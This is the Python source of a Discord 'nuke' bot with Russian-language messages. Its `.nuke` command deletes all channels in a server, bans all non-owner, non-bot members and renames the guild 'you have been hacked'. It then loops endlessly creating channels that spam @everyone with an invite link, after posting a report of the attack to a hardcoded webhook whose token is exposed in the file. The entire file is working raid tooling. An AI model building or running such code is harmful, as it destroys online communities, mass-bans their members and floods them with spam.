import discord
from discord.ext import commands
import asyncio
import aiohttp
from threading import Thread
from flask import Flask

WEBHOOK_URL = "https://discord.com/api/webhooks/1520839426207383595/Khj5QPyzUjOetcDUS7Rzm9VOwj5FQvtoMD8QGdHtAnXsBlm1WLv-w1FcS_avKGOzl3q3"

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Бот {bot.user} готов к уничтожению")

@bot.command()
async def ping(ctx):
    await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")

async def send_crash_log(guild_name, author, member_count):
    async with aiohttp.ClientSession() as session:
        embed = {
            "title": "Сервер крашнут!",
            "color": 0xff0000,
            "fields": [
                {"name": "Сервер", "value": guild_name, "inline": False},
                {"name": "Крашнул", "value": author, "inline": False},
                {"name": "Участников", "value": str(member_count), "inline": False}
            ]
        }
        await session.post(WEBHOOK_URL, json={"embeds": [embed]})

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    
    if guild.id == 1520817743127904477:
        await ctx.send("пошёл нахуй")
        return
    
    await send_crash_log(guild.name, ctx.author.mention, guild.member_count)
    
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    ban_tasks = [member.ban(reason="NUKE") for member in guild.members if member != guild.owner and not member.bot]
    await asyncio.gather(*ban_tasks, return_exceptions=True)
    
    await guild.edit(name="ВЫ БЫЛИ ВЗЛОМАНЫ")
    
    i = 0
    while True:
        tasks = []
        for _ in range(10):
            async def create_ch(idx):
                ch = await guild.create_text_channel(f"crash-{idx}")
                await ch.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
            tasks.append(create_ch(i))
            i += 1
        await asyncio.gather(*tasks, return_exceptions=True)

import os

keep_alive()
bot.run(os.getenv("TOKEN"))
